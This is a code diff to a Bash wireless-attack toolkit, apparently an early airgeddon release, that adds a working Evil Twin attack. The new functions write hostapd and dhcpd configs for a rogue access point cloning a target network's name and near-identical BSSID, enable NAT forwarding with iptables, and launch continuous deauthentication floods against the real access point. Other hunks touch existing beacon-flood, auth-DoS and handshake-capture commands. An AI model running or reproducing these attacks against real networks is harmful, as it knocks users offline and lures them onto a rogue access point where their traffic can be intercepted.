@@ -49,8 +49,9 @@ optional_tools_names=(
 						"aireplay-ng"
 						"mdk3"
 						"hashcat"
-						"airbase-ng"
+						"hostapd"
 						"dhcpd"
+						"iptables"
 					)
 declare -A optional_tools=(
 							[${optional_tools_names[0]}]=0
@@ -60,13 +61,13 @@ declare -A optional_tools=(
 							[${optional_tools_names[4]}]=0
 							[${optional_tools_names[5]}]=0
 							[${optional_tools_names[6]}]=0
+							[${optional_tools_names[7]}]=0
 						)
 update_tools=("curl")
 
 #General vars
 standardhandshake_filename="handshake-01.cap"
 tmpdir="/tmp/"
-tmpfiles_toclean=0
 osversionfile_dir="/etc/"
 minimum_bash_version_required="4.0"
 resume_message=224
@@ -74,6 +75,29 @@ abort_question=12
 pending_of_translation="[PoT]"
 escaped_pending_of_translation="\[PoT\]"
 standard_resolution="1024x768"
+
+#Dhcpd and Hostapd vars
+ip_range="192.168.1.0"
+alt_ip_range="172.16.250.0"
+router_ip="192.168.1.1"
+alt_router_ip="172.16.250.1"
+broadcast_ip="192.168.1.255"
+alt_broadcast_ip="172.16.250.255"
+range_start="192.168.1.33"
+range_stop="192.168.1.100"
+alt_range_start="172.16.250.33"
+alt_range_stop="172.16.250.100"
+std_c_mask="255.255.255.0"
+ip_mask="255.255.255.255"
+dhcpd_file="ag.dhcpd.conf"
+dns1="8.8.8.8"
+dns2="8.8.4.4"
+hostapd_file="ag.hostapd.conf"
+possible_dhcp_leases_files=(
+							"/var/lib/dhcp/dhcpd.leases"
+							"/var/state/dhcp/dhcpd.leases"
+							"/var/lib/dhcpd/dhcpd.leases"
+						)
 
 #Distros vars
 known_compatible_distros=(
@@ -314,11 +338,11 @@ function language_strings() {
 	arr["catalan",25]="Seleccioni un canal (1-14) :"
 	arr["portuguese",25]="$pending_of_translation Escolha um canal (1-14) :"
 
-	arr["english",26]="Channel set to $channel"
-	arr["spanish",26]="Canal elegido $channel"
-	arr["french",26]="Le canal $channel a été choisi"
-	arr["catalan",26]="El canal $channel s'ha escollit"
-	arr["portuguese",26]="$pending_of_translation Canal $channel selecionado"
+	arr["english",26]="Channel set to "${normal_color}"$channel"
+	arr["spanish",26]="Canal elegido "${normal_color}"$channel"
+	arr["french",26]="Le canal "${normal_color}"$channel"${blue_color}" a été choisi"
+	arr["catalan",26]="El canal "${normal_color}"$channel"${blue_color}" s'ha escollit"
+	arr["portuguese",26]="$pending_of_translation Canal "${normal_color}"$channel"${blue_color}" selecionado"
 
 	arr["english",27]="Type target BSSID (example: 00:11:22:33:44:55) :"
 	arr["spanish",27]="Escribe el BSSID objetivo (ejemplo: 00:11:22:33:44:55) :"
@@ -326,11 +350,11 @@ function language_strings() {
 	arr["catalan",27]="Escriu el BSSID objectiu (exemple: 00:11:22:33:44:55) :"
 	arr["portuguese",27]="$pending_of_translation Escreva o BSSID alvo (exemplo: 00:11:22:33:44:55) :"
 
-	arr["english",28]="BSSID set to $bssid"
-	arr["spanish",28]="BSSID elegido $bssid"
-	arr["french",28]="Le BSSID choisi est $bssid"
-	arr["catalan",28]="El BSSID escollit $bssid"
-	arr["portuguese",28]="$pending_of_translation BSSID escolhida $bssid"
+	arr["english",28]="BSSID set to "${normal_color}"$bssid"
+	arr["spanish",28]="BSSID elegido "${normal_color}"$bssid"
+	arr["french",28]="Le BSSID choisi est "${normal_color}"$bssid"
+	arr["catalan",28]="El BSSID escollit "${normal_color}"$bssid"
+	arr["portuguese",28]="$pending_of_translation BSSID escolhida "${normal_color}"$bssid"
 
 	arr["english",29]="Type target ESSID :"
 	arr["spanish",29]="Escribe el ESSID objetivo :"
@@ -344,11 +368,11 @@ function language_strings() {
 	arr["catalan",30]="Has seleccionat un ESSID de xarxa oculta. No es pot utilitzar. Selecciona un altre o executa un atac basat en BSSID en lloc d'aquest"
 	arr["portuguese",30]="$pending_of_translation Você selecionou uma rede ESSID oculto. Você não pode usar. Selecione outro ou executar um ataque com base BSSID ao invés desta"
 
-	arr["english",31]="ESSID set to $essid"
-	arr["spanish",31]="ESSID elegido $essid"
-	arr["french",31]="l'ESSID sélectionné est $essid"
-	arr["catalan",31]="l'ESSID seleccionat $essid"
-	arr["portuguese",31]="$pending_of_translation $essid ESSID escolhido"
+	arr["english",31]="ESSID set to "${normal_color}"$essid"
+	arr["spanish",31]="ESSID elegido "${normal_color}"$essid"
+	arr["french",31]="l'ESSID sélectionné est "${normal_color}"$essid"
+	arr["catalan",31]="l'ESSID seleccionat "${normal_color}"$essid"
+	arr["portuguese",31]="$pending_of_translation ESSID escolhido "${normal_color}"$essid"
 
 	arr["english",32]="All parameters set"
 	arr["spanish",32]="Todos los parámetros están listos"
@@ -1935,6 +1959,30 @@ function language_strings() {
 	arr["catalan",295]="$pending_of_translation Detecció resolució... No s'ha pogut detectar!, usant estàndard : "${normal_color}"$resolution"
 	arr["portuguese",295]="$pending_of_translation Detectando resolução... Não foi possível detectar!, usando o padrão : "${normal_color}"$resolution"
 
+	arr["english",296]="All parameters and requirements are set. The attack is going to start. Multiple windows will be opened, don't close anyone. When you want to stop the attack press Enter on this window and the script will automatically close them all"
+	arr["spanish",296]="Todos los parámetros y requerimientos están listos. Va a comenzar el ataque. Se abrirán múltiples ventanas, no cierres ninguna. Cuando quieras parar el ataque pulsa Enter en esta ventana y el script cerrará automaticamente todo"
+	arr["french",296]="$pending_of_translation Tous les paramètres et les exigences sont prêts. Vous allez commencer l'attaque. plusieurs fenêtres, ne ferment pas ouvert. Lorsque vous voulez arrêter l'attaque a frappé Entrez dans cette fenêtre et le script se ferme automatiquement tous"
+	arr["catalan",296]="$pending_of_translation Tots els paràmetres i requeriments estan preparats. Va a començar l'atac. S'obriran múltiples finestres, no tancaments cap. Quan vulguis parar l'atac prem Enter en aquesta finestra i el script tancarà automàticament tot"
+	arr["portuguese",296]="$pending_of_translation Todos os parâmetros e requisitos estão prontos. Você vai começar o ataque. várias janelas, não fechar qualquer aberto. Quando quiser parar o ataque pressione Enter nesta janela eo script irá fechar automaticamente todos"
+
+	arr["english",297]="Cleaning iptables and routing rules"
+	arr["spanish",297]="Limpiando iptables y reglas de routing"
+	arr["french",297]="$pending_of_translation Effacement des iptables et règles de routage"
+	arr["catalan",297]="$pending_of_translation Netejant iptables i regles de routing"
+	arr["portuguese",297]="$pending_of_translation Limpar iptables e regras de roteamento"
+
+	arr["english",298]="Evil Twin attack has been started. Press Enter key on this window to stop it"
+	arr["spanish",298]="El ataque Evil Twin ha comenzado. Pulse la tecla Enter en esta ventana para pararlo"
+	arr["french",298]="$pending_of_translation Evil Twin attaque a commencé. Appuyez sur la touche Entrée de cette fenêtre pour arrêter"
+	arr["catalan",298]="$pending_of_translation L'atac Evil Twin ha començat. Premeu la tecla Enter a aquesta finestra per aturar-lo"
+	arr["portuguese",298]="$pending_of_translation Evil tTin ataque começou. Pressione a tecla Enter nesta janela para parar"
+
+	arr["english",299]="Restoring interface..."
+	arr["spanish",299]="Restaurando interfaz..."
+	arr["french",299]="$pending_of_translation Interface restauration..."
+	arr["catalan",299]="$pending_of_translation Restaurant interfície..."
+	arr["portuguese",299]="$pending_of_translation Interface de restauração..."
+
 	case "$3" in
 		"yellow")
 			interrupt_checkpoint ${2} ${3}
@@ -2122,10 +2170,7 @@ function check_monitor_enabled() {
 function check_interface_wifi() {
 
 	execute_iwconfig_fix
-	if [[ "$?" != "0" ]]; then
-		return 1
-	fi
-	return 0
+	return $?
 }
 
 function execute_iwconfig_fix() {
@@ -2135,6 +2180,54 @@ function execute_iwconfig_fix() {
 	eval ${iwcmd}
 
 	return $?
+}
+
+function prepare_et_monitor() {
+
+	disable_rfkill
+
+	phy_iface=$(ls -l "/sys/class/net/$interface/phy80211" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/' 2> /dev/null)
+	iface_phy_number=${phy_iface:3:1}
+	iface_monitor_et_deauth="mon$iface_phy_number"
+
+	iw phy ${phy_iface} interface add ${iface_monitor_et_deauth} type monitor 2> /dev/null
+	ifconfig ${iface_monitor_et_deauth} up > /dev/null 2>&1
+	iwconfig ${iface_monitor_et_deauth} channel ${channel} > /dev/null 2>&1
+}
+
+function prepare_et_interface() {
+
+	et_initial_state=${ifacemode}
+
+	if [ ${ifacemode} != "Managed" ]; then
+		new_interface=$(${airmon} stop ${interface} 2> /dev/null | grep station)
+		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+		if [ "$interface" != "$new_interface" ]; then
+			interface=${new_interface}
+		fi
+	fi
+}
+
+function restore_et_interface() {
+
+	echo
+	language_strings ${language} 299 "blue"
+
+	disable_rfkill
+
+	iw dev ${iface_monitor_et_deauth} del > /dev/null 2>&1
+
+	if [ ${et_initial_state} = "Managed" ]; then
+		ifconfig ${interface} down > /dev/null 2>&1
+		iwconfig ${interface} mode managed > /dev/null 2>&1
+		ifconfig ${interface} up > /dev/null 2>&1
+	else
+		new_interface=$(${airmon} start ${interface} 2> /dev/null | grep monitor)
+		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+		if [ "$interface" != "$new_interface" ]; then
+			interface=${new_interface}
+		fi
+	fi
 }
 
 function disable_rfkill() {
@@ -2507,7 +2600,7 @@ function ask_channel() {
 		read_channel
 	done
 	echo
-	language_strings ${language} 26 "yellow"
+	language_strings ${language} 26 "blue"
 }
 
 function read_bssid() {
@@ -2523,7 +2616,7 @@ function ask_bssid() {
 		read_bssid
 	done
 	echo
-	language_strings ${language} 28 "yellow"
+	language_strings ${language} 28 "blue"
 }
 
 function read_essid() {
@@ -2545,7 +2638,7 @@ function ask_essid() {
 	fi
 
 	echo
-	language_strings ${language} 31 "yellow"
+	language_strings ${language} 31 "blue"
 }
 
 function exec_mdk3deauth() {
@@ -2561,7 +2654,7 @@ function exec_mdk3deauth() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel}
+	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} > /dev/null 2>&1
 }
 
 function exec_aireplaydeauth() {
@@ -2575,7 +2668,7 @@ function exec_aireplaydeauth() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface}
+	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} > /dev/null 2>&1
 }
 
 function exec_wdsconfusion() {
@@ -2587,7 +2680,7 @@ function exec_wdsconfusion() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel}
+	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} > /dev/null 2>&1
 }
 
 function exec_beaconflood() {
@@ -2599,7 +2692,7 @@ function exec_beaconflood() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "beacon flood attack" -e mdk3 ${interface} b -n ${essid} -c ${channel} -s 1000 -h
+	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "beacon flood attack" -e mdk3 ${interface} b -n ${essid} -c ${channel} -s 1000 -h > /dev/null 2>&1
 }
 
 function exec_authdos() {
@@ -2611,7 +2704,7 @@ function exec_authdos() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "auth dos attack" -e mdk3 ${interface} a -a ${bssid} -m -s 1024
+	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "auth dos attack" -e mdk3 ${interface} a -a ${bssid} -m -s 1024 > /dev/null 2>&1
 }
 
 function exec_michaelshutdown() {
@@ -2623,7 +2716,7 @@ function exec_michaelshutdown() {
 	echo
 	language_strings ${language} 33 "blue"
 	language_strings ${language} 4 "read"
-	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "michael shutdown attack" -e mdk3 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024
+	xterm +j -sb -rightbar -geometry ${g1_topleft_window} -T "michael shutdown attack" -e mdk3 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024 > /dev/null 2>&1
 }
 
 function mdk3_deauth_option() {
@@ -2797,7 +2890,11 @@ function print_all_target_vars_et() {
 	fi
 
 	if [ -n "$essid" ]; then
-		language_strings ${language} 46 "blue"
+		if [ "$essid" = "(Hidden Network)" ]; then
+			language_strings ${language} 45 "blue"
+		else
+			language_strings ${language} 46 "blue"
+		fi
 	else
 		language_strings ${language} 274 "blue"
 	fi
@@ -2818,7 +2915,11 @@ function print_et_target_vars() {
 	fi
 
 	if [ -n "$essid" ]; then
-		language_strings ${language} 46 "blue"
+		if [ "$essid" = "(Hidden Network)" ]; then
+			language_strings ${language} 45 "blue"
+		else
+			language_strings ${language} 46 "blue"
+		fi
 	else
 		language_strings ${language} 274 "blue"
 	fi
@@ -2863,7 +2964,7 @@ function initialize_menu_options_dependencies() {
 	aireplay_attack_dependencies=(${optional_tools_names[2]})
 	mdk3_attack_dependencies=(${optional_tools_names[3]})
 	hashcat_attacks_dependencies=(${optional_tools_names[4]})
-	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]})
+	et_onlyap_dependencies=(${optional_tools_names[5]} ${optional_tools_names[6]} ${optional_tools_names[7]})
 }
 
 function initialize_menu_and_print_selections() {
@@ -2895,6 +2996,7 @@ function initialize_menu_and_print_selections() {
 		"evil_twin_attacks_menu")
 			return_to_et_main_menu=0
 			et_mode=""
+			et_processes=()
 			print_iface_selected
 			print_all_target_vars_et
 			print_iface_internet_selected
@@ -2916,9 +3018,20 @@ function clean_tmpfiles() {
 	rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
 	rm -rf ${tmpdir}"handshake"* > /dev/null 2>&1
 	rm -rf ${tmpdir}"nws"* > /dev/null 2>&1
-	rm -rf ${tmpdir}"clts.csv" > /dev/null 2>&1
+	rm -rf ${tmpdir}"clts"* > /dev/null 2>&1
 	rm -rf ${tmpdir}"wnws.txt" > /dev/null 2>&1
 	rm -rf ${tmpdir}"hctmp"* > /dev/null 2>&1
+	rm -rf "$tmpdir$hostapd_file" > /dev/null 2>&1
+	rm -rf "$tmpdir$dhcpd_file" > /dev/null 2>&1
+}
+
+function clean_routing_rules() {
+
+	echo "0" > /proc/sys/net/ipv4/ip_forward
+	iptables -F
+	iptables -t nat -F
+	iptables -X
+	iptables -t nat -X
 }
 
 function store_array() {
@@ -3131,20 +3244,56 @@ function evil_twin_attacks_menu() {
 		6)
 			under_construction_message
 			#TODO: Evil Twin AP with sniffing
-			#et_mode="et_sniffing"
-			#et_dos_menu
+			#contains_element "$et_option" "${forbidden_options[@]}"
+			#if [ "$?" = "0" ]; then
+			#	forbidden_menu_option
+			#else
+			#	check_interface_wifi
+			#	if [ "$?" = "0" ]; then
+			#		et_mode="et_sniffing"
+			#		et_dos_menu
+			#	else
+			#		echo
+			#		language_strings ${language} 281 "yellow"
+			#		language_strings ${language} 115 "read"
+			#	fi
+			#fi
 		;;
 		7)
 			under_construction_message
 			#TODO: Evil Twin AP with sniffing and sslstrip
-			#et_mode="et_sniffing_sslstrip"
-			#et_dos_menu
+			#contains_element "$et_option" "${forbidden_options[@]}"
+			#if [ "$?" = "0" ]; then
+			#	forbidden_menu_option
+			#else
+			#	check_interface_wifi
+			#	if [ "$?" = "0" ]; then
+			#		et_mode="et_sniffing_sslstrip"
+			#		et_dos_menu
+			#	else
+			#		echo
+			#		language_strings ${language} 281 "yellow"
+			#		language_strings ${language} 115 "read"
+			#	fi
+			#fi
 		;;
 		8)
 			under_construction_message
 			#TODO: Evil Twin AP with captive portal
-			#et_mode="et_captive_portal"
-			#et_dos_menu
+			#contains_element "$et_option" "${forbidden_options[@]}"
+			#if [ "$?" = "0" ]; then
+			#	forbidden_menu_option
+			#else
+			#	check_interface_wifi
+			#	if [ "$?" = "0" ]; then
+			#		et_mode="et_captive_portal"
+			#		et_dos_menu
+			#	else
+			#		echo
+			#		language_strings ${language} 281 "yellow"
+			#		language_strings ${language} 115 "read"
+			#	fi
+			#fi
 		;;
 		9)
 			return
@@ -3718,8 +3867,137 @@ function exec_hashcat_rulebased_attack() {
 
 function exec_et_onlyap_attack() {
 
+	set_hostapd_config
+	launch_fake_ap
+	set_dhcp_config
+	set_std_internet_routing_rules
+	launch_dhcp_server
+	exec_et_deauth
+
 	echo
-	#TODO exec Evil Twin only ap attack
+	language_strings ${language} 298 "yellow"
+	language_strings ${language} 115 "read"
+
+	kill_et_windows
+	restore_et_interface
+}
+
+function set_hostapd_config() {
+
+	tmpfiles_toclean=1
+	rm -rf "$tmpdir$hostapd_file" > /dev/null 2>&1
+
+	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n100 | grep -v "${bssid:10:1}" | head -c 1)
+	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}
+
+	echo -e "interface=$interface\ndriver=nl80211\nssid=$essid\nchannel=$channel\nbssid=$et_bssid" > "$tmpdir$hostapd_file"
+}
+
+function launch_fake_ap() {
+
+	killall hostapd > /dev/null 2>&1
+	check_kill_needed=1
+	${airmon} check kill > /dev/null 2>&1
+	xterm -hold -bg black -fg blue -geometry ${g3_topleft_window} -T "AP" -e "hostapd \"$tmpdir$hostapd_file\"" > /dev/null 2>&1 &
+	et_processes+=($!)
+	sleep 3
+}
+
+function set_dhcp_config() {
+
+	route | grep ${ip_range} > /dev/null
+	if [ "$?" != "0" ]; then
+		et_ip_range=${ip_range}
+		et_ip_router=${router_ip}
+		et_broadcast_ip=${broadcast_ip}
+		et_range_start=${range_start}
+		et_range_stop=${range_stop}
+	else
+		et_ip_range=${alt_ip_range}
+		et_ip_router=${alt_router_ip}
+		et_broadcast_ip=${alt_broadcast_ip}
+		et_range_start=${alt_range_start}
+		et_range_stop=${alt_range_stop}
+	fi
+
+	tmpfiles_toclean=1
+	rm -rf "$tmpdir$dhcpd_file" > /dev/null 2>&1
+
+	echo -e "authoritative;\ndefault-lease-time 600;\nmax-lease-time 7200;\n" > "$tmpdir$dhcpd_file"
+	echo -e "subnet $et_ip_range netmask $std_c_mask {\n\toption broadcast-address $et_broadcast_ip;" >> "$tmpdir$dhcpd_file"
+	echo -e "\toption routers $et_ip_router;\n\toption subnet-mask $std_c_mask;\n\toption domain-name-servers $dns1, $dns2;" >> "$tmpdir$dhcpd_file"
+	echo -e "\trange $et_range_start $et_range_stop;\n}" >> "$tmpdir$dhcpd_file"
+
+	leases_found=0
+	for item in ${!possible_dhcp_leases_files[@]}; do
+		if [ -f "${possible_dhcp_leases_files[$item]}" ]; then
+			leases_found=1
+			key_leases_found=${item}
+			break
+		fi
+	done
+
+	if [ ${leases_found} -eq 1 ]; then
+		echo -e "\nlease-file-name \"${possible_dhcp_leases_files[$key_leases_found]}\";" >> "$tmpdir$dhcpd_file"
+	else
+		touch "${possible_dhcp_leases_files[$key_leases_found]}"
+		echo -e "\nlease-file-name \"${possible_dhcp_leases_files[0]}\";" >> "$tmpdir$dhcpd_file"
+	fi
+}
+
+function set_std_internet_routing_rules() {
+
+	routing_toclean=1
+	ifconfig ${interface} ${et_ip_router} netmask ${std_c_mask} > /dev/null 2>&1
+	echo "1" > /proc/sys/net/ipv4/ip_forward
+
+	iptables -F
+	iptables -t nat -F
+	iptables -P FORWARD ACCEPT
+	iptables -t nat -A POSTROUTING -j MASQUERADE
+	iptables -A INPUT -s ${et_ip_range}/${std_c_mask} -d ${et_ip_router}/${ip_mask} -j DROP
+	sleep 2
+}
+
+function launch_dhcp_server() {
+
+	killall dhcpd > /dev/null 2>&1
+	xterm -hold -bg black -fg pink -geometry ${g3_middleleft_window} -T "DHCP" -e "dhcpd -d -f -cf \"$tmpdir$dhcpd_file\" $interface 2>&1 | tee -a $tmpdir/clts.txt" > /dev/null 2>&1 &
+	et_processes+=($!)
+	sleep 2
+}
+
+function exec_et_deauth() {
+
+	prepare_et_monitor
+
+	case ${et_dos_attack} in
+		"Mdk3")
+			killall mdk3 > /dev/null 2>&1
+			rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
+			echo ${bssid} > ${tmpdir}"bl.txt"
+			deauth_et_cmd="mdk3 ${iface_monitor_et_deauth} d -b $tmpdir\"bl.txt\" -c $channel"
+		;;
+		"Aireplay")
+			killall aireplay-ng > /dev/null 2>&1
+			deauth_et_cmd="aireplay-ng --deauth 0 -a $bssid --ignore-negative-one $iface_monitor_et_deauth"
+		;;
+		"Wds Confusion")
+			killall mdk3 > /dev/null 2>&1
+			deauth_et_cmd="mdk3 $iface_monitor_et_deauth w -e $essid -c $channel"
+		;;
+	esac
+
+	xterm -hold -bg black -fg red -geometry ${g3_bottomleft_window} -T "Deauth" -e "$deauth_et_cmd" > /dev/null 2>&1 &
+	et_processes+=($!)
+	sleep 1
+}
+
+function kill_et_windows() {
+
+	for item in ${et_processes[@]}; do
+		kill ${item} &> /dev/null
+	done
 }
 
 function convert_cap_to_hashcat_format() {
@@ -4124,7 +4402,7 @@ function attack_handshake_menu() {
 				capture_handshake_window
 				rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
 				echo ${bssid} > ${tmpdir}"bl.txt"
-				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} &
+				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} > /dev/null 2>&1 &
 				sleeptimeattack=12
 			fi
 		;;
@@ -4136,7 +4414,7 @@ function attack_handshake_menu() {
 			else
 				capture_handshake_window
 				${airmon} start ${interface} ${channel} > /dev/null 2>&1
-				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} &
+				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} > /dev/null 2>&1 &
 				sleeptimeattack=12
 			fi
 		;;
@@ -4147,7 +4425,7 @@ function attack_handshake_menu() {
 				attack_handshake_menu "new"
 			else
 				capture_handshake_window
-				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} &
+				xterm +j -sb -rightbar -geometry ${g1_bottomleft_window} -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} > /dev/null 2>&1 &
 				sleeptimeattack=16
 			fi
 		;;
@@ -4174,7 +4452,7 @@ function capture_handshake_window() {
 	language_strings ${language} 115 "read"
 
 	rm -rf ${tmpdir}"handshake"* > /dev/null 2>&1
-	xterm +j -sb -rightbar -geometry ${g1_topright_window} -T "Capturing Handshake" -e airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}"handshake" ${interface} &
+	xterm +j -sb -rightbar -geometry ${g1_topright_window} -T "Capturing Handshake" -e airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}"handshake" ${interface} > /dev/null 2>&1 &
 	processidcapture=$!
 }
 
@@ -4198,7 +4476,7 @@ function explore_for_targets_option() {
 	tmpfiles_toclean=1
 	rm -rf ${tmpdir}"nws"* > /dev/null 2>&1
 	rm -rf ${tmpdir}"clts.csv" > /dev/null 2>&1
-	xterm +j -sb -rightbar -geometry ${g1_topright_window} -T "Exploring for targets" -e airodump-ng -w ${tmpdir}"nws" ${interface}
+	xterm +j -sb -rightbar -geometry ${g1_topright_window} -T "Exploring for targets" -e airodump-ng -w ${tmpdir}"nws" ${interface} > /dev/null 2>&1
 	targetline=`cat ${tmpdir}"nws-01.csv" | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
 	targetline=`expr ${targetline} - 1`
 
@@ -4358,6 +4636,14 @@ function et_prerequisites() {
 				return_to_et_main_menu=1
 				return
 			fi
+			ask_bssid
+			ask_channel
+			ask_essid
+			return_to_et_main_menu=1
+			echo
+			language_strings ${language} 296 "yellow"
+			language_strings ${language} 115 "read"
+			prepare_et_interface
 			exec_et_onlyap_attack
 		;;
 		"et_sniffing")
@@ -4605,6 +4891,16 @@ function exit_script_option() {
 		action_on_exit_taken=1
 		language_strings ${language} 164 "multiline"
 		clean_tmpfiles
+		time_loop
+		echo -e ${green_color}" Ok\r"${normal_color}
+	fi
+
+	if [ ${routing_toclean} -eq 1 ]; then
+		action_on_exit_taken=1
+		language_strings ${language} 297 "multiline"
+		clean_routing_rules
+		killall dhcpd > /dev/null 2>&1
+		killall hostapd > /dev/null 2>&1
 		time_loop
 		echo -e ${green_color}" Ok\r"${normal_color}
 	fi
@@ -4969,6 +5265,8 @@ function initialize_script_settings() {
 	check_kill_needed=0
 	airmon_fix
 	autochanged_language=0
+	tmpfiles_toclean=0
+	routing_toclean=0
 }
 
 function detect_screen_resolution() {
